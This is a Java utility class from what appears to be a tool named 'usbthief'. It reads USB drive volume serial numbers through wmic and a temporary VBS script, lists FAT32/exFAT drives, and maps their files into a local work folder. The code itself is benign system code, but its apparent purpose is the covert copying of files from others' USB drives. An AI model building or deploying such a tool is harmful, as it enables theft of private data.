package com.superredrock.usbthief.core;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.nio.file.*;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.concurrent.ConcurrentHashMap;
import java.util.logging.Logger;

public class DeviceUtils {

    protected static final Logger logger = Logger.getLogger(DeviceUtils.class.getName());

    private static final Map<String, String> serialNumberCache = new ConcurrentHashMap<>();

    /**
     * Gets volume serial number for a drive using cached results.
     * Uses wmic command for efficient retrieval without temporary files.
     * Falls back to VBS script if wmic fails.
     *
     * @param drive drive letter (e.g., "E:" or "E:\\")
     * @return volume serial number, or empty string if retrieval fails
     */
    public static String getHardDiskSN(String drive) {
        if (drive == null || drive.isEmpty()) {
            return "";
        }

        // Normalize drive path
        String normalizedDrive = drive.endsWith(":") ? drive : drive.substring(0, 2);

        // Check cache first
        String cached = serialNumberCache.get(normalizedDrive);
        if (cached != null) {
            return cached;
        }

        // Try wmic command first
        String serial = getSerialNumberViaWmic(normalizedDrive);

        // Fallback to VBS if wmic fails
        if (serial.isEmpty()) {
            logger.fine("wmic failed for drive: " + normalizedDrive + ", trying VBS fallback");
            serial = getSerialNumberViaVbs(normalizedDrive);
        }

        // Cache result
        if (!serial.isEmpty()) {
            serialNumberCache.put(normalizedDrive, serial);
        }

        return serial;
    }

    /**
     * Gets serial number using wmic command.
     * Tries multiple command formats for better compatibility.
     *
     * @param drive normalized drive letter (e.g., "C:")
     * @return serial number or empty string if failed
     */
    private static String getSerialNumberViaWmic(String drive) {
        StringBuilder result = new StringBuilder();
        StringBuilder errorOutput = new StringBuilder();

        try {
            // Try different wmic command formats
            String[] commands = {
                "wmic logicaldisk where \"DeviceID='" + drive + "'\" get VolumeSerialNumber /value",
                "wmic logicaldisk where \"DeviceID='" + drive + "'\" get VolumeSerialNumber",
                "wmic logicaldisk get Name,VolumeSerialNumber"
            };

            for (String cmd : commands) {
                Process process = Runtime.getRuntime().exec(new String[]{"cmd", "/c", cmd});

                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
                BufferedReader errorReader = new BufferedReader(new InputStreamReader(process.getErrorStream()));

                String line;
                while ((line = reader.readLine()) != null) {
                    line = line.trim();
                    if (line.startsWith("VolumeSerialNumber=")) {
                        result.append(line.substring("VolumeSerialNumber=".length()).trim());
                        break;
                    } else if (!line.isEmpty() && !line.startsWith("VolumeSerialNumber") && !line.startsWith("Node") && !line.startsWith("Name")) {
                        // Try to parse tab-separated format
                        String[] parts = line.split("\\s+");
                        if (parts.length >= 2 && parts[0].equals(drive)) {
                            result.append(parts[1]);
                            break;
                        }
                    }
                }

                // Read error output
                while ((line = errorReader.readLine()) != null) {
                    errorOutput.append(line).append("\n");
                }

                reader.close();
                errorReader.close();

                int exitCode = process.waitFor();

                if (exitCode == 0 && !result.toString().isEmpty()) {
                    return result.toString();
                }

                logger.fine("wmic command failed: " + cmd + " - exit code: " + exitCode);
                if (!errorOutput.toString().isEmpty()) {
                    logger.fine("wmic error output: " + errorOutput);
                }

                // Reset for next attempt
                result.setLength(0);
                errorOutput.setLength(0);
            }

        } catch (IOException | InterruptedException e) {
            logger.fine("wmic exception: " + e.getMessage());
        }

        return "";
    }

    /**
     * Gets serial number using VBS script (fallback method).
     * Creates a temporary VBS file and executes it.
     *
     * @param drive normalized drive letter (e.g., "C:")
     * @return serial number or empty string if failed
     */
    private static String getSerialNumberViaVbs(String drive) {
        StringBuilder result = new StringBuilder();
        Path vbsPath = null;
        Process process = null;

        try {
            vbsPath = Files.createTempFile("getsn", ".vbs");

            String vbs = "Set objFSO = CreateObject(\"Scripting.FileSystemObject\")\n"
                    + "Set colDrives = objFSO.Drives\n"
                    + "On Error Resume Next\n"
                    + "Set objDrive = colDrives.item(\"" + drive + "\")\n"
                    + "If Err.Number <> 0 Then\n"
                    + "  Wscript.Echo \"\"\n"
                    + "Else\n"
                    + "  Wscript.Echo objDrive.SerialNumber\n"
                    + "End If";

            Files.writeString(vbsPath, vbs);

            process = Runtime.getRuntime().exec("cscript //NoLogo \"" + vbsPath + "\"");

            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
            String line;
            while ((line = reader.readLine()) != null) {
                result.append(line);
            }
            reader.close();

            int exitCode = process.waitFor();
            if (exitCode != 0) {
                logger.warning("VBS script failed with exit code: " + exitCode + " for drive: " + drive);
            }

        } catch (IOException | InterruptedException e) {
            logger.warning("VBS method failed for drive: " + drive + " - " + e.getMessage());
            return "";
        } finally {
            if (process != null) {
                process.destroy();
            }
            if (vbsPath != null) {
                try {
                    Files.deleteIfExists(vbsPath);
                } catch (IOException e) {
                    logger.fine("Failed to delete temp file: " + vbsPath);
                }
            }
        }

        return result.toString().trim();
    }

    /**
     * Clears the serial number cache.
     * Useful for testing or when drives are hot-swapped.
     */
    public static void clearSerialNumberCache() {
        serialNumberCache.clear();
        logger.fine("Serial number cache cleared");
    }

    public static Path getRoot(FileStore store){
        String DiskID = store.toString().substring(store.toString().length() - 4);
        return Path.of(DiskID.substring(1,3));
    }

    public static Path getSystemRoot(){
        String os = System.getProperty("os.name").toLowerCase();

        if (os.contains("win")) {
            return Path.of("C:");
        } else {
            Path path = Path.of("/");
            if (os.contains("nix") || os.contains("nux") || os.contains("aix")) {
                return path;
            } else if (os.contains("mac")) {
                return path;
            } else {
                return Path.of("");
            }
        }
    }

    public static List<FileStore> getUsbDisk(){
        ArrayList<FileStore> list = new ArrayList<>();
        for (FileStore store : FileSystems.getDefault().getFileStores()) {
            if (store.type().equals("exFAT") || store.type().equals("FAT32")) {
                list.add(store);
            }
        }
        return list;
    }

    public static Path getPath(Path workPath, Path target) throws IOException {
        Path root = target.getRoot();
        Path relative = root.relativize(target);
        String storeName = Files.getFileStore(target).name();
        Device device = QueueManager.getDeviceManager().getDevice(target);
        return workPath.resolve(storeName + "_" + device.getSerialNumber()).resolve(relative);
    }

}
